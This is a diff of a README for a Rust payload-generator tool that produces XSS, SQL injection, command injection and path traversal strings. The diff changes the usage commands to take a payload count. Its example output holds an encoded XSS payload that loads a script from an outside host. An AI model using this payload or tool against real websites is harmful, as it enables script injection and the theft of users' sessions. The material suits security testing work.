@@ -52,13 +52,16 @@ cargo build --reléase
 
 
 
-cargo run -- <payload_type> <attack_type> [custom_payload]
+cargo run --release <payload_type> <attack_type> <number_of_payloads>
+
 
 <payload_type>: raw
 
 <attack_type>: xss, sqlinjection, commandinjection, pathtraversal
 
 [custom_payload] (optional): Custom payload path for path traversal
+
+<number_of_payloads>: The number of payloads you want to generate.
 
 ## Usage
 
@@ -67,23 +70,23 @@ To generate a payload, run the application with the desired parameters:
 ### XSS Payload:
 
 
-cargo run -- raw xss
+cargo run -- raw xss {number}
 
 ### SQL Injection Payload:
 
 
-cargo run -- raw sqlinjection
+cargo run -- raw sqlinjection {number}
 
 ### Command Injection Payload:
 
 
-cargo run -- raw commandinjection
+cargo run -- raw commandinjection {number}
 
 
 ### Path Traversal Payload with Custom Payload:
 
 
-cargo run -- raw pathtraversal /path/to/custom/payload.txt
+cargo run -- raw pathtraversal {number}
 
 ### Example Output
 
@@ -91,6 +94,10 @@ cargo run -- raw pathtraversal /path/to/custom/payload.txt
 Raw: %3Ciframe src='javascript:alert("&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;")'%3E%3C/iframe%3E
 Hex: <encoded_hex_value>
 Base64: <encoded_base64_value>
+
+### Viewing Generated Payloads
+
+Generated payloads are saved in archives/generated_payloads.txt. You can review this file to see the crafted payloads.
 
 ## Contributing
 
